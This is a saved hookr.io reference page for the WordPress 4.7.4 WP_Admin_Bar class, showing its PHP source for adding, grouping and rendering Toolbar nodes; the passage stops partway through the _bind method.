<!DOCTYPE html> <!--[if lt IE 7]><html class="hookr class lt-ie9 lt-ie8 lt-ie7 ie"><![endif]--> <!--[if IE 7]><html class="hookr class lt-ie9 lt-ie8 ie7 ie"><![endif]--> <!--[if IE 8]><html class="hookr class lt-ie9 ie8 ie"><![endif]--> <!--[if IE 9]><html class="hookr class ie9 ie"><![endif]--> <!--[if gt IE 9]><html class="hookr class gt-ie9 ie"><![endif]--><html lang="en-US" id="single" class="hookr class" data-site="wordpress" data-type="class" data-id="5082"><head xmlns="http://www.w3.org/1999/xhtml"><title> wp_admin_bar | class | WordPress | hookr.io</title><meta charset="UTF-8"><meta name="author" content="thepassionofthechris \m/," /><meta name="keywords" content="WP_Admin_Bar, class, wordpress, 4.7.4" /><meta name="description" content="Core class used to implement the Toolbar API." /><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><link rel="shortcut icon" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.ico" /><link rel="icon" type="image/png" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.png"><link rel="icon" type="image/gif" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.gif"><link rel="icon" type="image/jpeg" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.jpg"><meta name="google-site-verification" content="Q5dnl0YziNqRLCBxFtc2Rd8vUuueYAt6VIUYZItvEL4" /><script type="text/javascript">/*<![CDATA[*/window._wpemojiSettings={"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/hookr.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4.13"}};!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;return g&&g.fillText?(g.textBaseline="top",g.font="600 32px Arial","flag"===a?(g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3):"diversity"===a?(g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e):("simple"===a?g.fillText(h(55357,56835),0,0):g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);/*]]>*/</script><style type="text/css">img.wp-smiley,img.emoji{display:inline !important;border:none !important;box-shadow:none !important;height:1em !important;width:1em !important;margin:0
.07em !important;vertical-align:-0.1em !important;background:none !important;padding:0
!important}</style><link rel='stylesheet' id='screen-css'  href='http://hookr.io/wp-content/themes/hookr/assets/css/hookr.css?ver=47fb32f389278c83d3e9b3397b9b7ed7' type='text/css' media='screen' /><link rel='stylesheet' id='qtip-css'  href='http://hookr.io/wp-content/themes/hookr/assets/vendor/jquery.qtip.custom/jquery.qtip.min.css?ver=4.4.13' type='text/css' media='screen' /><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/fU9dGoIwDLsQW_XbHbyAXmCMAsNBsS2otxcYvqFP_UmaJg66x4T8LtzemD427BVtH4fiBC3RncGLoAp0AqWYRDS2lA4ZMw4VMZREKsp-NM46e14PlShpHJc_UwSsawz6R6CbURX38oNzDUwp3egSX1iZ3osif0PIhinVK3YQI9NsWNYRs6dAnCNt0zNWDW4OPw.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9YvzdTPzS8tTtXLzcwDAA.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/fZBBDsIwDAQ_RG1Kn8AvuKWJUQ1JHBIXVF5PKOoFKZV8Gc_KK3nAmVHNWCBwPAxfKp4d5ZWPOIncM5pSSAve6jxmygskbyxN4mvwP_Sk6KRSSJ6vS9dDD6eNGkdXbu3hV9nUs7JvSpNqrzXK0uwFKyFJpKg7V3jPwZPp1XjDm7JYz2kUk10XTFHK6LgoXqo5b-YD.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9DPyM_PLtJPLC5OLSnWL0vNS8kv0s8qLE0tqtQrLMks0EsuLS7Jz0URys3MAwA.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9YvzdRPTUtLTS7RzchMz8gB4hK93Mw8HQP9jPz87CL9xOLi1JJi_axiCF8vsSBTrzgzLz0nFQA.js"></script><link rel='https://api.w.org/' href='http://hookr.io/wp-json/' /><link rel="canonical" href="http://hookr.io/classes/wp_admin_bar/" /><link rel="alternate" type="application/json+oembed" href="http://hookr.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhookr.io%2Fclasses%2Fwp_admin_bar%2F" /><link rel="alternate" type="text/xml+oembed" href="http://hookr.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhookr.io%2Fclasses%2Fwp_admin_bar%2F&#038;format=xml" /><script>/*<![CDATA[*/if('undefined'===typeof Hookr)
var Hookr={};if('undefined'===typeof Hookr.Util)
Hookr.Util={};Hookr.Util=jQuery&&jQuery.extend(Hookr.Util,{"adminAjax":"http:\/\/hookr.io\/wp-admin\/admin-ajax.php","themeUrl":"http:\/\/hookr.io\/wp-content\/themes\/hookr\/","apiKey":"wordpress-4.7.4-class-wp_admin_bar","actions":{"popover":0,"range":1,"search":2,"stat":3}});/*]]>*/</script><!--[if lt IE 9]><script src="http://hookr.io/wp-content/themes/hookr/assets/js/html5shiv.js"></script><script src="http://hookr.io/wp-content/themes/hookr/assets/js/html5shiv-printshiv.js"></script><![endif]--></head><body id="wp_admin_bar" class="single single-class single-format-standard"><div id="gutter"><div><ul id="nav-breadcrumb" role="navigation" class="pivot clear fix"><li class="home"><a title="Go to hookr.io." href="http://hookr.io" class="home">hookr.io</a></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to 4.7.4." href="http://hookr.io/4.7.4/" class="H_VERSION"><span property="name">4.7.4</span></a><meta property="position" content="2"></span></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to classes." href="http://hookr.io/4.7.4/classes/" class=""><span property="name">classes</span></a><meta property="position" content="3"></span></li><li>/</li><li class="current_item"><span property="itemListElement" typeof="ListItem"><span property="name">wp_admin_bar</span><meta property="position" content="4"></span></li></ul></div></div><header class="jv-fixed"><div> <button class="btn" data-jv-trigger="left"><span></span></button><h1 title="hookr.io"><a href="http://hookr.io" title="hookr.io"><img src="http://hookr.io/wp-content/themes/hookr/assets/images/hookr.svg" title="The WordPress Hook/API Index" alt="The WordPress Hook/API Index"/></a></h1> <nav id="nav-api-types" class="pivot clearfix" data-jv-order="0" data-jv-content="left" data-active="class"><ul role="navigation"><li class="" data-id="all" data-count="6316"><a href="http://hookr.io/4.7.4/all/" title="All">All <span class="count badge">6316</span></a></li><li class="" data-id="new" data-count="6"><a href="http://hookr.io/4.7.4/new/" title="New">New <span class="count badge">6</span></a></li><li class="" data-id="hooks" data-count="2538"><a href="http://hookr.io/4.7.4/hooks/" title="Hooks">Hooks <span class="count badge">2538</span></a></li><li class="" data-id="action" data-count="864"><a href="http://hookr.io/4.7.4/actions/" title="Actions">Actions <span class="count badge">864</span></a></li><li class="" data-id="filter" data-count="1674"><a href="http://hookr.io/4.7.4/filters/" title="Filters">Filters <span class="count badge">1674</span></a></li><li class="active" data-id="class" data-count="351"><a href="http://hookr.io/4.7.4/classes/" title="Classes">Classes <span class="count badge">351</span></a></li><li class="" data-id="constant" data-count="566"><a href="http://hookr.io/4.7.4/constants/" title="Constants">Constants <span class="count badge">566</span></a></li><li class="" data-id="function" data-count="2853"><a href="http://hookr.io/4.7.4/functions/" title="Functions">Functions <span class="count badge">2853</span></a></li><li class="" data-id="shortcode" data-count="8"><a href="http://hookr.io/4.7.4/shortcodes/" title="Shortcodes">Shortcodes <span class="count badge">8</span></a></li></ul> </nav> <nav id="nav-main" class="pivot" data-jv-order="1" data-jv-content="left"><ul role="navigation"><li class="active"><a href="http://hookr.io/all/" title="Core">Core</a></li><li class=""><a href="http://hookr.io/plugins/" title="Plugins">Plugins</a></li><li class=""><a href="http://hookr.io/themes/" title="Themes">Themes</a></li><li class=""><a href="http://hookr.io/features/" title="Features">Features</a></li><li class=""><a href="http://hookr.io/plugin/" title="Plugin">Plugin</a></li><li class=""><a href="http://hookr.io/about/" title="About">About</a></li><li class=""><a href="http://hookr.io/contact/" title="Contact">Contact</a></li></ul> </nav></div> </header><div role="main" id="middle"><div><div id="mainbar"> <article><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?zoneid=1673&serve=C6AILKT&placement=hookrio" id="_carbonads_js"></script><noscript>derpy.</noscript> <section><h1><strong>WP_Admin_Bar</strong></h1><p>Core class used to implement the Toolbar API.</p> </section> <section id="defined" class="source"><h2>Defined <span class="count">(1)</span></h2><p>The class is defined in the following location(s).</p><dl><dt><strong><a href="http://hookr.io/4.7.4/files/wp-includes-class-wp-admin-bar/" class="file">/wp-includes/class-wp-admin-bar.php <span>&nbsp;</span></a></strong></dt><dd><pre><ol data-line="15" class="block" start="15"><li><div>class WP_Admin_Bar {&nbsp;</div></li><li><div>    private $nodes = array();&nbsp;</div></li><li><div>    private $bound = false;&nbsp;</div></li><li><div>    public $user;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param string $name&nbsp;</div></li><li><div>     * @return string|array|void&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function __get( $name ) {&nbsp;</div></li><li><div>        switch ( $name ) {&nbsp;</div></li><li><div>            case 'proto' :&nbsp;</div></li><li><div>                return is_ssl() ? 'https://' : 'http://';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            case 'menu' :&nbsp;</div></li><li><div>                _deprecated_argument( 'WP_Admin_Bar', '3.3.0', 'Modify admin bar nodes with WP_Admin_Bar::get_node(), WP_Admin_Bar::add_node(), and WP_Admin_Bar::remove_node(), not the &lt;code&gt;menu&lt;/code&gt; property.' );&nbsp;</div></li><li><div>                return array(); // Sorry, folks.&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @access public&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function initialize() {&nbsp;</div></li><li><div>        $this-&gt;user = new stdClass;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( is_user_logged_in() ) {&nbsp;</div></li><li><div>            /** Populate settings we need for the menu based on the current user. */&nbsp;</div></li><li><div>            $this-&gt;user-&gt;blogs = get_blogs_of_user( get_current_user_id() );&nbsp;</div></li><li><div>            if ( is_multisite() ) {&nbsp;</div></li><li><div>                $this-&gt;user-&gt;active_blog = get_active_blog_for_user( get_current_user_id() );&nbsp;</div></li><li><div>                $this-&gt;user-&gt;domain = empty( $this-&gt;user-&gt;active_blog ) ? user_admin_url() : trailingslashit( get_home_url( $this-&gt;user-&gt;active_blog-&gt;blog_id ) );&nbsp;</div></li><li><div>                $this-&gt;user-&gt;account_domain = $this-&gt;user-&gt;domain;&nbsp;</div></li><li><div>            } else {&nbsp;</div></li><li><div>                $this-&gt;user-&gt;active_blog = $this-&gt;user-&gt;blogs[get_current_blog_id()];&nbsp;</div></li><li><div>                $this-&gt;user-&gt;domain = trailingslashit( home_url() );&nbsp;</div></li><li><div>                $this-&gt;user-&gt;account_domain = $this-&gt;user-&gt;domain;&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'wp_head', 'wp_admin_bar_header' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'admin_head', 'wp_admin_bar_header' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( current_theme_supports( 'admin-bar' ) ) {&nbsp;</div></li><li><div>            /**&nbsp;</div></li><li><div>             * To remove the default padding styles from WordPress for the Toolbar, use the following code:&nbsp;</div></li><li><div>             * add_theme_support( 'admin-bar', array( 'callback' =&gt; '__return_false' ) );&nbsp;</div></li><li><div>             */&nbsp;</div></li><li><div>            $admin_bar_args = get_theme_support( 'admin-bar' );&nbsp;</div></li><li><div>            $header_callback = $admin_bar_args[0]['callback'];&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( empty($header_callback) )&nbsp;</div></li><li><div>            $header_callback = '_admin_bar_bump_cb';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action('wp_head', $header_callback);&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        wp_enqueue_script( 'admin-bar' );&nbsp;</div></li><li><div>        wp_enqueue_style( 'admin-bar' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        /**&nbsp;</div></li><li><div>         * Fires after WP_Admin_Bar is initialized.&nbsp;</div></li><li><div>         *&nbsp;</div></li><li><div>         * @since 3.1.0&nbsp;</div></li><li><div>         */&nbsp;</div></li><li><div>        do_action( 'admin_bar_init' );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param array $node&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function add_menu( $node ) {&nbsp;</div></li><li><div>        $this-&gt;add_node( $node );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param string $id&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function remove_menu( $id ) {&nbsp;</div></li><li><div>        $this-&gt;remove_node( $id );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Adds a node to the menu.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 3.1.0&nbsp;</div></li><li><div>     * @since 4.5.0 Added the ability to pass 'lang' and 'dir' meta data.&nbsp;</div></li><li><div>     * @access public&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param array $args {&nbsp;</div></li><li><div>     *     Arguments for adding a node.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     *     @type string $id     ID of the item.&nbsp;</div></li><li><div>     *     @type string $title  Title of the node.&nbsp;</div></li><li><div>     *     @type string $parent Optional. ID of the parent node.&nbsp;</div></li><li><div>     *     @type string $href   Optional. Link for the item.&nbsp;</div></li><li><div>     *     @type bool   $group  Optional. Whether or not the node is a group. Default false.&nbsp;</div></li><li><div>     *     @type array  $meta   Meta data including the following keys: 'html', 'class', 'rel', 'lang', 'dir', &nbsp;</div></li><li><div>     *                          'onclick', 'target', 'title', 'tabindex'. Default empty.&nbsp;</div></li><li><div>     * }&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function add_node( $args ) {&nbsp;</div></li><li><div>        // Shim for old method signature: add_node( $parent_id, $menu_obj, $args )&nbsp;</div></li><li><div>        if ( func_num_args() &gt;= 3 && is_string( func_get_arg(0) ) )&nbsp;</div></li><li><div>            $args = array_merge( array( 'parent' =&gt; func_get_arg(0) ), func_get_arg(2) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( is_object( $args ) )&nbsp;</div></li><li><div>            $args = get_object_vars( $args );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Ensure we have a valid title.&nbsp;</div></li><li><div>        if ( empty( $args['id'] ) ) {&nbsp;</div></li><li><div>            if ( empty( $args['title'] ) )&nbsp;</div></li><li><div>                return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            _doing_it_wrong( __METHOD__, __( 'The menu ID should not be empty.' ), '3.3.0' );&nbsp;</div></li><li><div>            // Deprecated: Generate an ID from the title.&nbsp;</div></li><li><div>            $args['id'] = esc_attr( sanitize_title( trim( $args['title'] ) ) );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $defaults = array(&nbsp;</div></li><li><div>            'id' =&gt; false, &nbsp;</div></li><li><div>            'title' =&gt; false, &nbsp;</div></li><li><div>            'parent' =&gt; false, &nbsp;</div></li><li><div>            'href' =&gt; false, &nbsp;</div></li><li><div>            'group' =&gt; false, &nbsp;</div></li><li><div>            'meta' =&gt; array(), &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // If the node already exists, keep any data that isn't provided.&nbsp;</div></li><li><div>        if ( $maybe_defaults = $this-&gt;get_node( $args['id'] ) )&nbsp;</div></li><li><div>            $defaults = get_object_vars( $maybe_defaults );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Do the same for 'meta' items.&nbsp;</div></li><li><div>        if ( ! empty( $defaults['meta'] ) && ! empty( $args['meta'] ) )&nbsp;</div></li><li><div>            $args['meta'] = wp_parse_args( $args['meta'], $defaults['meta'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $args = wp_parse_args( $args, $defaults );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $back_compat_parents = array(&nbsp;</div></li><li><div>            'my-account-with-avatar' =&gt; array( 'my-account', '3.3' ), &nbsp;</div></li><li><div>            'my-blogs' =&gt; array( 'my-sites', '3.3' ), &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( isset( $back_compat_parents[ $args['parent'] ] ) ) {&nbsp;</div></li><li><div>            list( $new_parent, $version ) = $back_compat_parents[ $args['parent'] ];&nbsp;</div></li><li><div>            _deprecated_argument( __METHOD__, $version, sprintf( 'Use &lt;code&gt;%s&lt;/code&gt; as the parent for the &lt;code&gt;%s&lt;/code&gt; admin bar node instead of &lt;code&gt;%s&lt;/code&gt;.', $new_parent, $args['id'], $args['parent'] ) );&nbsp;</div></li><li><div>            $args['parent'] = $new_parent;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $this-&gt;_set_node( $args );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param array $args&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _set_node( $args ) {&nbsp;</div></li><li><div>        $this-&gt;nodes[ $args['id'] ] = (object) $args;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Gets a node.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param string $id&nbsp;</div></li><li><div>     * @return object Node.&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final public function get_node( $id ) {&nbsp;</div></li><li><div>        if ( $node = $this-&gt;_get_node( $id ) )&nbsp;</div></li><li><div>            return clone $node;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param string $id&nbsp;</div></li><li><div>     * @return object|void&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _get_node( $id ) {&nbsp;</div></li><li><div>        if ( $this-&gt;bound )&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( empty( $id ) )&nbsp;</div></li><li><div>            $id = 'root';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( isset( $this-&gt;nodes[ $id ] ) )&nbsp;</div></li><li><div>            return $this-&gt;nodes[ $id ];&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @return array|void&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final public function get_nodes() {&nbsp;</div></li><li><div>        if ( ! $nodes = $this-&gt;_get_nodes() )&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        foreach ( $nodes as &$node ) {&nbsp;</div></li><li><div>            $node = clone $node;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        return $nodes;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @return array|void&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _get_nodes() {&nbsp;</div></li><li><div>        if ( $this-&gt;bound )&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        return $this-&gt;nodes;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Add a group to a menu node.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @since 3.3.0&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param array $args {&nbsp;</div></li><li><div>     *     Array of arguments for adding a group.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     *     @type string $id     ID of the item.&nbsp;</div></li><li><div>     *     @type string $parent Optional. ID of the parent node. Default 'root'.&nbsp;</div></li><li><div>     *     @type array  $meta   Meta data for the group including the following keys:&nbsp;</div></li><li><div>     *                         'class', 'onclick', 'target', and 'title'.&nbsp;</div></li><li><div>     * }&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final public function add_group( $args ) {&nbsp;</div></li><li><div>        $args['group'] = true;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $this-&gt;add_node( $args );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * Remove a node.&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @param string $id The ID of the item.&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function remove_node( $id ) {&nbsp;</div></li><li><div>        $this-&gt;_unset_node( $id );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param string $id&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _unset_node( $id ) {&nbsp;</div></li><li><div>        unset( $this-&gt;nodes[ $id ] );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @access public&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function render() {&nbsp;</div></li><li><div>        $root = $this-&gt;_bind();&nbsp;</div></li><li><div>        if ( $root )&nbsp;</div></li><li><div>            $this-&gt;_render( $root );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @return object|void&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _bind() {&nbsp;</div></li><li><div>        if ( $this-&gt;bound )&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Add the root node.&nbsp;</div></li><li><div>        // Clear it first, just in case. Don't mess with The Root.&nbsp;</div></li><li><div>        $this-&gt;remove_node( 'root' );&nbsp;</div></li><li><div>        $this-&gt;add_node( array(&nbsp;</div></li><li><div>            'id' =&gt; 'root', &nbsp;</div></li><li><div>            'group' =&gt; false, &nbsp;</div></li><li><div> ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Normalize nodes: define internal 'children' and 'type' properties.&nbsp;</div></li><li><div>        foreach ( $this-&gt;_get_nodes() as $node ) {&nbsp;</div></li><li><div>            $node-&gt;children = array();&nbsp;</div></li><li><div>            $node-&gt;type = ( $node-&gt;group ) ? 'group' : 'item';&nbsp;</div></li><li><div>            unset( $node-&gt;group );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // The Root wants your orphans. No lonely items allowed.&nbsp;</div></li><li><div>            if ( ! $node-&gt;parent )&nbsp;</div></li><li><div>                $node-&gt;parent = 'root';&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        foreach ( $this-&gt;_get_nodes() as $node ) {&nbsp;</div></li><li><div>            if ( 'root' == $node-&gt;id )&nbsp;</div></li><li><div>                continue;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // Fetch the parent node. If it isn't registered, ignore the node.&nbsp;</div></li><li><div>            if ( ! $parent = $this-&gt;_get_node( $node-&gt;parent ) ) {&nbsp;</div></li><li><div>                continue;&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // Generate the group class (we distinguish between top level and other level groups).&nbsp;</div></li><li><div>            $group_class = ( $node-&gt;parent == 'root' ) ? 'ab-top-menu' : 'ab-submenu';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( $node-&gt;type == 'group' ) {&nbsp;</div></li><li><div>                if ( empty( $node-&gt;meta['class'] ) )&nbsp;</div></li><li><div>                    $node-&gt;meta['class'] = $group_class;&nbsp;</div></li><li><div>                else&nbsp;</div></li><li><div>                    $node-&gt;meta['class'] .= ' ' . $group_class;&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // Items in items aren't allowed. Wrap nested items in 'default' groups.&nbsp;</div></li><li><div>            if ( $parent-&gt;type == 'item' && $node-&gt;type == 'item' ) {&nbsp;</div></li><li><div>                $default_id = $parent-&gt;id . '-default';&nbsp;</div></li><li><div>                $default = $this-&gt;_get_node( $default_id );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                // The default group is added here to allow groups that are&nbsp;</div></li><li><div>                // added before standard menu items to render first.&nbsp;</div></li><li><div>                if ( ! $default ) {&nbsp;</div></li><li><div>                    // Use _set_node because add_node can be overloaded.&nbsp;</div></li><li><div>                    // Make sure to specify default settings for all properties.&nbsp;</div></li><li><div>                    $this-&gt;_set_node( array(&nbsp;</div></li><li><div>                        'id' =&gt; $default_id, &nbsp;</div></li><li><div>                        'parent' =&gt; $parent-&gt;id, &nbsp;</div></li><li><div>                        'type' =&gt; 'group', &nbsp;</div></li><li><div>                        'children' =&gt; array(), &nbsp;</div></li><li><div>                        'meta' =&gt; array(&nbsp;</div></li><li><div>                            'class' =&gt; $group_class, &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>                        'title' =&gt; false, &nbsp;</div></li><li><div>                        'href' =&gt; false, &nbsp;</div></li><li><div> ) );&nbsp;</div></li><li><div>                    $default = $this-&gt;_get_node( $default_id );&nbsp;</div></li><li><div>                    $parent-&gt;children[] = $default;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>                $parent = $default;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // Groups in groups aren't allowed. Add a special 'container' node.&nbsp;</div></li><li><div>            // The container will invisibly wrap both groups.&nbsp;</div></li><li><div>            } elseif ( $parent-&gt;type == 'group' && $node-&gt;type == 'group' ) {&nbsp;</div></li><li><div>                $container_id = $parent-&gt;id . '-container';&nbsp;</div></li><li><div>                $container = $this-&gt;_get_node( $container_id );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                // We need to create a container for this group, life is sad.&nbsp;</div></li><li><div>                if ( ! $container ) {&nbsp;</div></li><li><div>                    // Use _set_node because add_node can be overloaded.&nbsp;</div></li><li><div>                    // Make sure to specify default settings for all properties.&nbsp;</div></li><li><div>                    $this-&gt;_set_node( array(&nbsp;</div></li><li><div>                        'id' =&gt; $container_id, &nbsp;</div></li><li><div>                        'type' =&gt; 'container', &nbsp;</div></li><li><div>                        'children' =&gt; array( $parent ), &nbsp;</div></li><li><div>                        'parent' =&gt; false, &nbsp;</div></li><li><div>                        'title' =&gt; false, &nbsp;</div></li><li><div>                        'href' =&gt; false, &nbsp;</div></li><li><div>                        'meta' =&gt; array(), &nbsp;</div></li><li><div> ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    $container = $this-&gt;_get_node( $container_id );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    // Link the container node if a grandparent node exists.&nbsp;</div></li><li><div>                    $grandparent = $this-&gt;_get_node( $parent-&gt;parent );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    if ( $grandparent ) {&nbsp;</div></li><li><div>                        $container-&gt;parent = $grandparent-&gt;id;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                        $index = array_search( $parent, $grandparent-&gt;children, true );&nbsp;</div></li><li><div>                        if ( $index === false )&nbsp;</div></li><li><div>                            $grandparent-&gt;children[] = $container;&nbsp;</div></li><li><div>                        else&nbsp;</div></li><li><div>                            array_splice( $grandparent-&gt;children, $index, 1, array( $container ) );&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                    $parent-&gt;parent = $container-&gt;id;&nbsp;</div></li><li><div>                }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>                $parent = $container;&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // Update the parent ID (it might have changed).&nbsp;</div></li><li><div>            $node-&gt;parent = $parent-&gt;id;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            // Add the node to the tree.&nbsp;</div></li><li><div>            $parent-&gt;children[] = 